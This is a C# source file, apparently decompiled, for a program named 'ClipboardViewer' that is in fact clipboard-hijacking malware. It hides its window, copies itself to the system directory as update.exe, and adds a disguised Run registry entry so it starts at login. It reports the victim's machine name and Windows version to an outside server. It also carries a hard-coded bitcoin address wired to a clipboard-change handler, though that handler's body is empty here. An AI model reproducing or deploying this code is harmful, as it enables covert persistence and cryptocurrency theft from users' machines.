#define DEBUG
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ClipboardViewer;

public class MainForm : Form
{
	private string bitcoin = "1KKBwPTG8CVHAUVvDengGxSsatYjPiJYux";

	private string url = "http://priv8.jelasticlw.com.br/klbitcoin/acessou.php?acessou=true&nome=" + Environment.MachineName + "&windows=" + Environment.OSVersion;

	private ClipboardMonitor clipboardMonitor;

	public MainForm()
	{
		InitializeComponent();
		autoStart();
		ToggleTaskManager();
		Log();
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
	}

	public void ToggleTaskManager()
	{
	}

	public void autoStart()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		string text = Environment.SystemDirectory + "/update.exe";
		if (registryKey.GetValue("exploer") == null)
		{
			File.Copy(Application.get_ExecutablePath(), text, overwrite: true);
			registryKey.SetValue("exploer", text);
		}
	}

	public void Log()
	{
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
		HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		string message = new StreamReader(httpWebResponse.GetResponseStream()).ReadToEnd();
		Debug.WriteLine(message);
	}

	public void bitCoin()
	{
	}

	private void InitializeComponent()
	{
		clipboardMonitor = new ClipboardMonitor();
		((Control)this).SuspendLayout();
		((Control)clipboardMonitor).set_BackColor(Color.Red);
		((Control)clipboardMonitor).set_Location(new Point(0, 0));
		((Control)clipboardMonitor).set_Name("clipboardMonitor");
		((Control)clipboardMonitor).set_Size(new Size(0, 0));
		((Control)clipboardMonitor).set_TabIndex(0);
		((Control)clipboardMonitor).set_Visible(false);
		clipboardMonitor.ClipboardChanged += clipboardMonitor_ClipboardChanged;
		((Form)this).set_ClientSize(new Size(284, 262));
		((Control)this).set_Name("MainForm");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)2);
		((Form)this).add_Load((EventHandler)MainForm_Load);
		((Control)this).ResumeLayout(false);
	}

	[STAThread]
	private static void Main()
	{
		Application.EnableVisualStyles();
		Application.Run((Form)(object)new MainForm());
	}

	private void clipboardMonitor_ClipboardChanged(object sender, ClipboardChangedEventArgs e)
	{
		bitCoin();
	}

	private void MainForm_Load(object sender, EventArgs e)
	{
	}
}
